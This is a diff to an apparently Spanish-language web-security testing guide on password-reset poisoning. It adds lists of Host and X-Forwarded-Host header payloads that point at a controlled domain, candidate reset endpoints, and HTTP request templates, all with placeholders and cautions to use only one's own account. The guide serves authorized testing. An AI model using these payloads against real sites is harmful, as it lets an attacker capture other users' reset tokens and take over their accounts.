@@ -8,7 +8,90 @@
 - Mantener igual método, sesión, cabeceras y cuerpo salvo el campo bajo prueba.
 - Usar un marcador único como `prueba-123` para distinguir reflejos y efectos de caché.
 
-## 🔬 Pruebas por escenario
+> **Lectura del banco:** cuando un bloque enumera varias URL, rutas, cabeceras o cuerpos, cada línea suele ser una alternativa. Elegir la variante que corresponde al motor, parser y flujo real.
+
+## 💉 Payloads básicos
+
+### Cabeceras de origen una por solicitud
+
+```text
+Host: {DOMINIO_LEGITIMO}
+Host: {DOMINIO_CONTROLADO}
+X-Forwarded-Host: {DOMINIO_CONTROLADO}
+X-Original-Host: {DOMINIO_CONTROLADO}
+X-Host: {DOMINIO_CONTROLADO}
+```
+
+**Cuándo usarlo:** Solicitar reset solo para un correo propio y cambiar una cabecera por intento. Verificar el enlace recibido en ese buzón: la reflexión en HTML no prueba poisoning.
+
+**Fuente:** [PortSwigger](https://portswigger.net/web-security/host-header/exploiting/password-reset-poisoning).
+
+
+### Variantes de host y puerto
+
+```text
+Host: {DOMINIO_LEGITIMO}:443
+Host: {DOMINIO_LEGITIMO}:{PUERTO_DE_PRUEBA}
+Host: {DOMINIO_CONTROLADO}:443
+Forwarded: host={DOMINIO_CONTROLADO};proto=https
+X-Forwarded-Proto: https
+```
+
+**Cuándo usarlo:** Solo tiene sentido si proxy y aplicación reconstruyen URL absolutas desde estas cabeceras. Verificar que el enlace de reset use el host alterado; no abrirlo en sistemas ajenos.
+
+**Fuente:** [PortSwigger](https://portswigger.net/web-security/host-header/exploiting/password-reset-poisoning).
+
+
+## 🧭 Payloads por contexto
+
+### Construcción de enlace en rutas de recuperación
+
+```text
+POST /forgot-password
+POST /api/auth/forgot-password
+POST /api/v1/password/reset
+POST /account/recovery/start
+POST /users/{USUARIO_PROPIO}/reset
+```
+
+**Cuándo usarlo:** Identificar el endpoint real desde el flujo de una cuenta propia. Cada ruta es candidata a adaptar, no un listado para enviar masivamente.
+
+**Fuente:** [OWASP Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Forgot_Password_Cheat_Sheet.html).
+
+
+### Origen absoluto y cabecera duplicada
+
+```http
+POST https://{DOMINIO_LEGITIMO}/forgot-password HTTP/1.1
+Host: {DOMINIO_LEGITIMO}
+
+POST /forgot-password HTTP/1.1
+Host: {DOMINIO_LEGITIMO}
+Host: {DOMINIO_CONTROLADO}
+```
+
+**Cuándo usarlo:** Plantillas alternativas para un proxy autorizado. Las cabeceras Host duplicadas son ambiguas; probar individualmente y detenerse si hay efectos sobre usuarios ajenos.
+
+**Fuente:** [PortSwigger](https://portswigger.net/web-security/host-header/exploiting/password-reset-poisoning).
+
+
+## 🔥 Payloads avanzados
+
+### Token en URL de correo y destino
+
+```text
+https://{DOMINIO_LEGITIMO}/reset?token={TOKEN_PROPIO}
+https://{DOMINIO_CONTROLADO}/reset?token={TOKEN_PROPIO}
+https://{DOMINIO_LEGITIMO}/reset/{TOKEN_PROPIO}
+https://{DOMINIO_CONTROLADO}/reset/{TOKEN_PROPIO}
+```
+
+**Cuándo usarlo:** Comparar únicamente correos generados para tu cuenta. El impacto requiere que un token real sea enviado al dominio controlado y sea canjeable; no registrar el token sin redacción.
+
+**Fuente:** [PortSwigger](https://portswigger.net/web-security/host-header/exploiting/password-reset-poisoning).
+
+
+## 🔬 Pruebas guiadas por escenario
 
 ### 1. Host directo
 
@@ -24,7 +107,7 @@ email={EMAIL_PROPIO}
 
 **Interpretación:** Inspeccionar el correo recibido: la prueba relevante es la URL con token, no el texto HTTP inmediato.
 
-**Fuente técnica:** [documentación de la técnica](https://portswigger.net/web-security/host-header/exploiting/password-reset-poisoning).
+**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/host-header/exploiting/password-reset-poisoning).
 
 ### 2. X-Forwarded-Host
 
@@ -41,7 +124,7 @@ email={EMAIL_PROPIO}
 
 **Interpretación:** Confirmar dominio del enlace recibido. No afirmar toma de cuenta si el token no aparece o no es canjeable.
 
-**Fuente técnica:** [documentación de la técnica](https://portswigger.net/web-security/host-header/exploiting).
+**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/host-header/exploiting).
 
 ### 3. Forwarded host
 
@@ -58,7 +141,7 @@ email={EMAIL_PROPIO}
 
 **Interpretación:** El backend puede ignorarla. Registrar si el correo usa exactamente el host aportado.
 
-**Fuente técnica:** [documentación de la técnica](https://portswigger.net/web-security/host-header/exploiting).
+**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/host-header/exploiting).
 
 ### 4. X-Host
 
@@ -75,7 +158,7 @@ email={EMAIL_PROPIO}
 
 **Interpretación:** Comparar con el caso base sin X-Host; solo la URL recibida establece influencia real.
 
-**Fuente técnica:** [documentación de la técnica](https://portswigger.net/web-security/host-header/exploiting).
+**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/host-header/exploiting).
 
 ### 5. X-HTTP-Host-Override
 
@@ -92,7 +175,7 @@ email={EMAIL_PROPIO}
 
 **Interpretación:** Evitar envíos repetidos masivos; los correos y tokens de la cuenta propia permiten comparar.
 
-**Fuente técnica:** [documentación de la técnica](https://portswigger.net/web-security/host-header/exploiting).
+**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/host-header/exploiting).
 
 ### 6. Puerto de Host
 
@@ -108,7 +191,7 @@ email={EMAIL_PROPIO}
 
 **Interpretación:** No es fuga si el host sigue siendo legítimo; interesa un parser que valida host y genera una URL distinta.
 
-**Fuente técnica:** [documentación de la técnica](https://portswigger.net/web-security/host-header/exploiting).
+**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/host-header/exploiting).
 
 ### 7. Host duplicado en laboratorio
 
@@ -125,7 +208,40 @@ email={EMAIL_PROPIO}
 
 **Interpretación:** Muchos frontends lo rechazan. No enviar a infraestructura compartida sin permiso porque puede afectar enrutamiento.
 
-**Fuente técnica:** [documentación de la técnica](https://portswigger.net/web-security/host-header/exploiting).
+**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/host-header/exploiting).
+
+### 8. X-Forwarded-Server
+
+**Objetivo:** Solicitar un único reset de correo propio con la cabecera de host alternativa documentada.
+
+```http
+POST /forgot-password HTTP/1.1
+Host: {ORIGEN}
+X-Forwarded-Server: {CONTROLLED_HOST}
+Content-Type: application/x-www-form-urlencoded
+
+email={EMAIL_PROPIO}
+```
+
+**Interpretación:** Comparar la URL del correo con control sin header. Solo hay envenenamiento si el enlace canjeable incorpora el host propio.
+
+**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/host-header/exploiting).
+
+### 9. URL absoluta en request line
+
+**Objetivo:** En laboratorio con proxy que acepte absolute-form, contrastar autoridad de la request line y Host.
+
+```http
+POST https://{CONTROLLED_HOST}/forgot-password HTTP/1.1
+Host: {ORIGEN}
+Content-Type: application/x-www-form-urlencoded
+
+email={EMAIL_PROPIO}
+```
+
+**Interpretación:** Mantener la conexión al origen autorizado y usar solo correo propio. Confirmar que el token aparece en URL controlada, no solo un 302.
+
+**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/host-header/exploiting).
 
 ## ✅ Evidencia mínima
 
